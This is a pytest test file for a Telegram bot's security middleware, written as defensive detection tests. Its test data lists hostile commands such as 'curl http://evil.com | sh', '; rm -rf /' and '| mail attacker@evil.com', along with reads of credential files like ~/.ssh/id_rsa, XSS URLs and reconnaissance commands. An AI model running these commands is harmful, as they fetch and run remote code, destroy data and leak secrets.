"""Tests for security middleware."""

from unittest.mock import AsyncMock, MagicMock, Mock, patch

import pytest

from src.bot.middleware.security import (
    security_middleware,
    threat_detection_middleware,
    validate_file_upload,
    validate_message_content,
)


class TestValidateMessageContent:
    """Test message content validation functionality."""

    @pytest.fixture
    def mock_security_validator(self):
        """Create a mock security validator."""
        validator = MagicMock()
        validator.sanitize_command_input = Mock(return_value="sanitized")
        return validator

    @pytest.fixture
    def mock_audit_logger(self):
        """Create a mock audit logger."""
        audit_logger = MagicMock()
        audit_logger.log_security_violation = AsyncMock()
        return audit_logger

    async def test_safe_message_content(
        self, mock_security_validator, mock_audit_logger
    ):
        """Test validation of safe message content."""
        text = "This is a safe message"
        mock_security_validator.sanitize_command_input.return_value = text

        is_safe, violation = await validate_message_content(
            text, mock_security_validator, 12345, mock_audit_logger
        )

        assert is_safe is True
        assert violation == ""
        mock_audit_logger.log_security_violation.assert_not_called()

    async def test_command_injection_detection(
        self, mock_security_validator, mock_audit_logger
    ):
        """Test detection of command injection patterns."""
        dangerous_patterns = [
            "; rm -rf /",
            "; del important.txt",
            "; format C:",
            "test `whoami`",
            "test $(ls)",
            "&& rm file",
            "| mail attacker@evil.com",
            "> /dev/null",
            "curl http://evil.com | sh",
            "wget http://evil.com | sh",
            "exec(code)",
            "eval(code)",
        ]

        for pattern in dangerous_patterns:
            mock_audit_logger.log_security_violation.reset_mock()
            mock_security_validator.sanitize_command_input.return_value = pattern

            is_safe, violation = await validate_message_content(
                pattern, mock_security_validator, 12345, mock_audit_logger
            )

            assert is_safe is False
            assert violation == "Command injection attempt"
            mock_audit_logger.log_security_violation.assert_called_once()
            call_kwargs = (
                mock_audit_logger.log_security_violation.call_args.kwargs
            )
            assert call_kwargs["user_id"] == 12345
            assert call_kwargs["violation_type"] == "command_injection_attempt"
            assert call_kwargs["severity"] == "high"

    async def test_path_traversal_detection(
        self, mock_security_validator, mock_audit_logger
    ):
        """Test detection of path traversal attempts."""
        dangerous_paths = [
            "../../../etc/passwd",
            "~/.ssh/id_rsa",
            "/etc/shadow",
            "/var/log/auth.log",
            "/usr/bin/sudo",
            "/sys/kernel/",
            "/proc/self/",
        ]

        for path in dangerous_paths:
            mock_audit_logger.log_security_violation.reset_mock()
            mock_security_validator.sanitize_command_input.return_value = path

            is_safe, violation = await validate_message_content(
                path, mock_security_validator, 12345, mock_audit_logger
            )

            assert is_safe is False
            assert violation == "Path traversal attempt"
            mock_audit_logger.log_security_violation.assert_called_once()
            call_kwargs = (
                mock_audit_logger.log_security_violation.call_args.kwargs
            )
            assert call_kwargs["user_id"] == 12345
            assert call_kwargs["violation_type"] == "path_traversal_attempt"
            assert call_kwargs["severity"] == "high"

    async def test_suspicious_url_detection(
        self, mock_security_validator, mock_audit_logger
    ):
        """Test detection of suspicious URLs."""
        suspicious_urls = [
            "http://malware.ru/download",
            "https://phishing.tk/login",
            "http://spam.ml/click",
            "http://bit.ly/shortlink",
            "https://tinyurl.com/abc123",
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
        ]

        for url in suspicious_urls:
            mock_audit_logger.log_security_violation.reset_mock()
            mock_security_validator.sanitize_command_input.return_value = url

            is_safe, violation = await validate_message_content(
                url, mock_security_validator, 12345, mock_audit_logger
            )

            assert is_safe is False
            assert violation == "Suspicious URL detected"
            mock_audit_logger.log_security_violation.assert_called_once()
            call_kwargs = (
                mock_audit_logger.log_security_violation.call_args.kwargs
            )
            assert call_kwargs["user_id"] == 12345
            assert call_kwargs["violation_type"] == "suspicious_url"
            assert call_kwargs["severity"] == "medium"

    async def test_excessive_sanitization(
        self, mock_security_validator, mock_audit_logger
    ):
        """Test detection when excessive sanitization is required."""
        original_text = "a" * 100
        # More than 50% removed
        mock_security_validator.sanitize_command_input.return_value = "a" * 40

        is_safe, violation = await validate_message_content(
            original_text, mock_security_validator, 12345, mock_audit_logger
        )

        assert is_safe is False
        assert violation == "Content contains too many dangerous characters"
        mock_audit_logger.log_security_violation.assert_called_once()
        call_kwargs = mock_audit_logger.log_security_violation.call_args.kwargs
        assert call_kwargs["violation_type"] == "excessive_sanitization"
        assert call_kwargs["severity"] == "medium"

    async def test_validation_without_audit_logger(self, mock_security_validator):
        """Test validation without audit logger."""
        text = "; rm -rf /"
        mock_security_validator.sanitize_command_input.return_value = text

        is_safe, violation = await validate_message_content(
            text, mock_security_validator, 12345, None
        )

        assert is_safe is False
        assert violation == "Command injection attempt"

    async def test_case_insensitive_pattern_matching(
        self, mock_security_validator, mock_audit_logger
    ):
        """Test that pattern matching is case-insensitive."""
        text = "CURL http://evil.com | SH"
        mock_security_validator.sanitize_command_input.return_value = text

        is_safe, violation = await validate_message_content(
            text, mock_security_validator, 12345, mock_audit_logger
        )

        assert is_safe is False
        assert violation == "Command injection attempt"


class TestValidateFileUpload:
    """Test file upload validation functionality."""

    @pytest.fixture
    def mock_security_validator(self):
        """Create a mock security validator."""
        validator = MagicMock()
        validator.validate_filename = Mock(return_value=(True, None))
        return validator

    @pytest.fixture
    def mock_audit_logger(self):
        """Create a mock audit logger."""
        audit_logger = MagicMock()
        audit_logger.log_security_violation = AsyncMock()
        audit_logger.log_file_access = AsyncMock()
        return audit_logger

    @pytest.fixture
    def mock_document(self):
        """Create a mock document object."""
        document = MagicMock()
        document.file_name = "test.txt"
        document.file_size = 1024  # 1KB
        document.mime_type = "text/plain"
        return document

    async def test_valid_file_upload(
        self, mock_document, mock_security_validator, mock_audit_logger
    ):
        """Test validation of valid file upload."""
        is_safe, error = await validate_file_upload(
            mock_document, mock_security_validator, 12345, mock_audit_logger
        )

        assert is_safe is True
        assert error == ""
        mock_security_validator.validate_filename.assert_called_once_with("test.txt")
        mock_audit_logger.log_file_access.assert_called_once()
        call_kwargs = mock_audit_logger.log_file_access.call_args.kwargs
        assert call_kwargs["user_id"] == 12345
        assert call_kwargs["action"] == "upload_validated"
        assert call_kwargs["success"] is True

    async def test_dangerous_filename(
        self, mock_document, mock_security_validator, mock_audit_logger
    ):
        """Test rejection of dangerous filenames."""
        mock_security_validator.validate_filename.return_value = (
            False,
            "Dangerous filename",
        )

        is_safe, error = await validate_file_upload(
            mock_document, mock_security_validator, 12345, mock_audit_logger
        )

        assert is_safe is False
        assert error == "Dangerous filename"
        mock_audit_logger.log_security_violation.assert_called_once()
        call_kwargs = mock_audit_logger.log_security_violation.call_args.kwargs
        assert call_kwargs["violation_type"] == "dangerous_filename"
        assert call_kwargs["severity"] == "medium"

    async def test_file_size_limit_exceeded(
        self, mock_document, mock_security_validator, mock_audit_logger
    ):
        """Test rejection of files exceeding size limit."""
        mock_document.file_size = 11 * 1024 * 1024  # 11MB

        is_safe, error = await validate_file_upload(
            mock_document, mock_security_validator, 12345, mock_audit_logger
        )

        assert is_safe is False
        assert "File too large" in error
        assert "10MB" in error
        mock_audit_logger.log_security_violation.assert_called_once()
        call_kwargs = mock_audit_logger.log_security_violation.call_args.kwargs
        assert call_kwargs["violation_type"] == "file_too_large"
        assert call_kwargs["severity"] == "low"

    async def test_dangerous_mime_type(
        self, mock_document, mock_security_validator, mock_audit_logger
    ):
        """Test rejection of dangerous MIME types."""
        dangerous_mime_types = [
            "application/x-executable",
            "application/x-msdownload",
            "application/x-msdos-program",
            "application/x-dosexec",
            "application/x-winexe",
            "application/x-sh",
            "application/x-shellscript",
        ]

        for mime_type in dangerous_mime_types:
            mock_document.mime_type = mime_type
            mock_audit_logger.log_security_violation.reset_mock()

            is_safe, error = await validate_file_upload(
                mock_document, mock_security_validator, 12345, mock_audit_logger
            )

            assert is_safe is False
            assert "File type not allowed" in error
            mock_audit_logger.log_security_violation.assert_called_once()
            call_kwargs = (
                mock_audit_logger.log_security_violation.call_args.kwargs
            )
            assert call_kwargs["violation_type"] == "dangerous_mime_type"
            assert call_kwargs["severity"] == "high"

    async def test_file_without_attributes(
        self, mock_security_validator, mock_audit_logger
    ):
        """Test file validation with missing attributes."""
        document = MagicMock()
        # Remove attributes
        del document.file_name
        del document.file_size
        del document.mime_type

        is_safe, error = await validate_file_upload(
            document, mock_security_validator, 12345, mock_audit_logger
        )

        # Should use defaults: file_name="unknown", file_size=0, mime_type="unknown"
        assert is_safe is True
        assert error == ""

    async def test_validation_without_audit_logger(
        self, mock_document, mock_security_validator
    ):
        """Test file validation without audit logger."""
        is_safe, error = await validate_file_upload(
            mock_document, mock_security_validator, 12345, None
        )

        assert is_safe is True
        assert error == ""


class TestSecurityMiddleware:
    """Test security middleware functionality."""

    @pytest.fixture
    def mock_event(self):
        """Create a mock Telegram event/update."""
        event = MagicMock()
        event.effective_user = MagicMock()
        event.effective_user.id = 12345
        event.effective_user.username = "test_user"
        event.effective_message = MagicMock()
        event.effective_message.text = "safe message"
        event.effective_message.document = None
        event.effective_message.reply_text = AsyncMock()
        return event

    @pytest.fixture
    def mock_handler(self):
        """Create a mock handler function."""
        handler = AsyncMock()
        handler.return_value = "handler_result"
        return handler

    @pytest.fixture
    def mock_security_validator(self):
        """Create a mock security validator."""
        validator = MagicMock()
        validator.sanitize_command_input = Mock(return_value="sanitized")
        validator.validate_filename = Mock(return_value=(True, None))
        return validator

    @pytest.fixture
    def mock_audit_logger(self):
        """Create a mock audit logger."""
        audit_logger = MagicMock()
        audit_logger.log_security_violation = AsyncMock()
        audit_logger.log_file_access = AsyncMock()
        return audit_logger

    @pytest.fixture
    def mock_data(self, mock_security_validator, mock_audit_logger):
        """Create mock data dictionary."""
        return {
            "security_validator": mock_security_validator,
            "audit_logger": mock_audit_logger,
        }

    async def test_no_user_information(self, mock_handler, mock_data):
        """Test middleware with no user information."""
        event = MagicMock()
        event.effective_user = None

        result = await security_middleware(mock_handler, event, mock_data)

        assert result == "handler_result"
        mock_handler.assert_called_once_with(event, mock_data)

    async def test_no_security_validator(self, mock_event, mock_handler):
        """Test middleware when security validator is not available."""
        data = {}

        result = await security_middleware(mock_handler, mock_event, data)

        assert result == "handler_result"
        mock_handler.assert_called_once_with(mock_event, data)

    async def test_safe_text_message(self, mock_event, mock_handler, mock_data):
        """Test middleware with safe text message."""
        result = await security_middleware(mock_handler, mock_event, mock_data)

        assert result == "handler_result"
        mock_data["security_validator"].sanitize_command_input.assert_called_once()
        mock_handler.assert_called_once_with(mock_event, mock_data)
        mock_event.effective_message.reply_text.assert_not_called()

    async def test_dangerous_text_message(self, mock_event, mock_handler, mock_data):
        """Test middleware with dangerous text message."""
        mock_event.effective_message.text = "; rm -rf /"

        result = await security_middleware(mock_handler, mock_event, mock_data)

        assert result is None
        mock_event.effective_message.reply_text.assert_called_once()
        call_args = mock_event.effective_message.reply_text.call_args[0][0]
        assert "Security Alert" in call_args
        assert "Command injection attempt" in call_args
        mock_handler.assert_not_called()

    async def test_message_without_text(self, mock_handler, mock_data):
        """Test middleware with message that has no text."""
        event = MagicMock()
        event.effective_user = MagicMock()
        event.effective_user.id = 12345
        event.effective_user.username = "test_user"
        event.effective_message = MagicMock()
        event.effective_message.text = None
        event.effective_message.document = None

        result = await security_middleware(mock_handler, event, mock_data)

        assert result == "handler_result"
        mock_handler.assert_called_once()

    async def test_safe_file_upload(self, mock_event, mock_handler, mock_data):
        """Test middleware with safe file upload."""
        mock_document = MagicMock()
        mock_document.file_name = "test.txt"
        mock_document.file_size = 1024
        mock_document.mime_type = "text/plain"
        mock_event.effective_message.document = mock_document

        result = await security_middleware(mock_handler, mock_event, mock_data)

        assert result == "handler_result"
        mock_data["security_validator"].validate_filename.assert_called_once()
        mock_handler.assert_called_once()

    async def test_dangerous_file_upload(self, mock_event, mock_handler, mock_data):
        """Test middleware with dangerous file upload."""
        mock_document = MagicMock()
        mock_document.file_name = "malware.exe"
        mock_document.file_size = 1024
        mock_document.mime_type = "application/x-executable"
        mock_event.effective_message.document = mock_document

        result = await security_middleware(mock_handler, mock_event, mock_data)

        assert result is None
        mock_event.effective_message.reply_text.assert_called_once()
        call_args = mock_event.effective_message.reply_text.call_args[0][0]
        assert "File Upload Blocked" in call_args
        mock_handler.assert_not_called()

    async def test_user_without_username(self, mock_handler, mock_data):
        """Test middleware with user without username."""
        event = MagicMock()
        event.effective_user = MagicMock()
        event.effective_user.id = 12345
        del event.effective_user.username
        event.effective_message = MagicMock()
        event.effective_message.text = "safe"
        event.effective_message.document = None
        event.effective_message.reply_text = AsyncMock()

        mock_data["security_validator"].sanitize_command_input.return_value = "safe"

        result = await security_middleware(mock_handler, event, mock_data)

        assert result == "handler_result"
        mock_handler.assert_called_once()

    async def test_no_message_object(self, mock_handler, mock_data):
        """Test middleware when effective_message is None."""
        event = MagicMock()
        event.effective_user = MagicMock()
        event.effective_user.id = 12345
        event.effective_user.username = "test_user"
        event.effective_message = None

        result = await security_middleware(mock_handler, event, mock_data)

        assert result == "handler_result"
        mock_handler.assert_called_once()


class TestThreatDetectionMiddleware:
    """Test threat detection middleware functionality."""

    @pytest.fixture
    def mock_event(self):
        """Create a mock Telegram event/update."""
        event = MagicMock()
        event.effective_user = MagicMock()
        event.effective_user.id = 12345
        event.effective_message = MagicMock()
        event.effective_message.text = "normal message"
        event.effective_message.reply_text = AsyncMock()
        return event

    @pytest.fixture
    def mock_handler(self):
        """Create a mock handler function."""
        handler = AsyncMock()
        handler.return_value = "handler_result"
        return handler

    @pytest.fixture
    def mock_audit_logger(self):
        """Create a mock audit logger."""
        audit_logger = MagicMock()
        audit_logger.log_security_violation = AsyncMock()
        return audit_logger

    async def test_no_user_information(self, mock_handler):
        """Test threat detection with no user information."""
        event = MagicMock()
        event.effective_user = None
        data = {}

        result = await threat_detection_middleware(mock_handler, event, data)

        assert result == "handler_result"
        mock_handler.assert_called_once()

    async def test_normal_user_behavior(self, mock_event, mock_handler):
        """Test threat detection with normal behavior."""
        data = {}

        with patch("time.time", return_value=100.0):
            result = await threat_detection_middleware(mock_handler, mock_event, data)

            assert result == "handler_result"
            mock_handler.assert_called_once()
            assert "user_behavior" in data
            assert 12345 in data["user_behavior"]
            assert data["user_behavior"][12345]["message_count"] == 1

    async def test_reconnaissance_pattern_detection(self, mock_event, mock_handler):
        """Test detection of reconnaissance patterns."""
        recon_commands = [
            "ls /",
            "find /etc",
            "locate passwd",
            "which python",
            "whereis bash",
            "ps aux",
            "netstat -an",
            "lsof",
            "env",
            "printenv",
            "whoami",
            "id",
            "uname -a",
            "cat /etc/passwd",
            "cat /proc/cpuinfo",
        ]

        data = {}

        with patch("time.time", return_value=100.0):
            for cmd in recon_commands[:6]:  # Send 6 recon commands
                mock_event.effective_message.text = cmd
                result = await threat_detection_middleware(
                    mock_handler, mock_event, data
                )

            # Should trigger warning after 5 attempts
            assert data["user_behavior"][12345]["recon_attempts"] >= 6
            mock_event.effective_message.reply_text.assert_called()
            call_args = mock_event.effective_message.reply_text.call_args[0][0]
            assert "Suspicious Activity Detected" in call_args

    async def test_case_insensitive_recon_detection(self, mock_event, mock_handler):
        """Test that recon detection is case-insensitive."""
        data = {}

        with patch("time.time", return_value=100.0):
            for i in range(6):
                mock_event.effective_message.text = "LS /" if i % 2 == 0 else "ls /"
                await threat_detection_middleware(mock_handler, mock_event, data)

        assert data["user_behavior"][12345]["recon_attempts"] >= 6

    async def test_multiple_users_tracking(self, mock_handler):
        """Test independent tracking for multiple users."""
        event1 = MagicMock()
        event1.effective_user = MagicMock()
        event1.effective_user.id = 11111
        event1.effective_message = MagicMock()
        event1.effective_message.text = "ls /"
        event1.effective_message.reply_text = AsyncMock()

        event2 = MagicMock()
        event2.effective_user = MagicMock()
        event2.effective_user.id = 22222
        event2.effective_message = MagicMock()
        event2.effective_message.text = "normal message"
        event2.effective_message.reply_text = AsyncMock()

        data = {}

        with patch("time.time", return_value=100.0):
            for _ in range(6):
                await threat_detection_middleware(mock_handler, event1, data)

            await threat_detection_middleware(mock_handler, event2, data)

        # User 1 should have recon attempts
        assert data["user_behavior"][11111]["recon_attempts"] >= 6
        # User 2 should not
        assert data["user_behavior"][22222].get("recon_attempts", 0) == 0

    async def test_message_count_tracking(self, mock_event, mock_handler):
        """Test that message count is tracked."""
        data = {}

        with patch("time.time", return_value=100.0):
            for _ in range(5):
                await threat_detection_middleware(mock_handler, mock_event, data)

        assert data["user_behavior"][12345]["message_count"] == 5

    async def test_first_seen_timestamp(self, mock_event, mock_handler):
        """Test that first_seen timestamp is recorded."""
        data = {}

        with patch("time.time", return_value=100.0):
            await threat_detection_middleware(mock_handler, mock_event, data)

            assert data["user_behavior"][12345]["first_seen"] == 100.0

    async def test_threat_detection_with_audit_logger(
        self, mock_event, mock_handler, mock_audit_logger
    ):
        """Test that threats are logged to audit logger."""
        data = {"audit_logger": mock_audit_logger}

        with patch("time.time", return_value=100.0):
            for _ in range(6):
                mock_event.effective_message.text = "ls /"
                await threat_detection_middleware(mock_handler, mock_event, data)

        mock_audit_logger.log_security_violation.assert_called()
        call_kwargs = mock_audit_logger.log_security_violation.call_args.kwargs
        assert call_kwargs["user_id"] == 12345
        assert call_kwargs["violation_type"] == "reconnaissance_attempt"
        assert call_kwargs["severity"] == "high"

    async def test_threat_detection_without_audit_logger(self, mock_event, mock_handler):
        """Test threat detection without audit logger."""
        data = {}

        with patch("time.time", return_value=100.0):
            for _ in range(6):
                mock_event.effective_message.text = "ls /"
                result = await threat_detection_middleware(
                    mock_handler, mock_event, data
                )

        # Should still track and warn
        assert result == "handler_result"
        assert data["user_behavior"][12345]["recon_attempts"] >= 6

    async def test_no_message_object(self, mock_handler):
        """Test threat detection when effective_message is None."""
        event = MagicMock()
        event.effective_user = MagicMock()
        event.effective_user.id = 12345
        event.effective_message = None
        data = {}

        with patch("time.time", return_value=100.0):
            result = await threat_detection_middleware(mock_handler, event, data)

        assert result == "handler_result"
        assert data["user_behavior"][12345]["message_count"] == 1

    async def test_message_without_text(self, mock_handler):
        """Test threat detection when message has no text."""
        event = MagicMock()
        event.effective_user = MagicMock()
        event.effective_user.id = 12345
        event.effective_message = MagicMock()
        event.effective_message.text = ""  # Empty string instead of None
        data = {}

        with patch("time.time", return_value=100.0):
            result = await threat_detection_middleware(mock_handler, event, data)

        assert result == "handler_result"
        # Should not have recon attempts
        assert data["user_behavior"][12345].get("recon_attempts", 0) == 0

    async def test_warning_not_sent_below_threshold(self, mock_event, mock_handler):
        """Test that warning is not sent below threshold."""
        data = {}

        with patch("time.time", return_value=100.0):
            for _ in range(5):  # Just at threshold, not exceeding
                mock_event.effective_message.text = "ls /"
                await threat_detection_middleware(mock_handler, mock_event, data)

        # Should have 5 attempts but no warning yet
        assert data["user_behavior"][12345]["recon_attempts"] == 5
        mock_event.effective_message.reply_text.assert_not_called()

    async def test_continuing_after_warning(self, mock_event, mock_handler):
        """Test that handler continues after warning."""
        data = {}

        with patch("time.time", return_value=100.0):
            for _ in range(7):
                mock_event.effective_message.text = "ls /"
                result = await threat_detection_middleware(
                    mock_handler, mock_event, data
                )

        # Should continue processing even after warning
        assert result == "handler_result"
        mock_handler.assert_called()
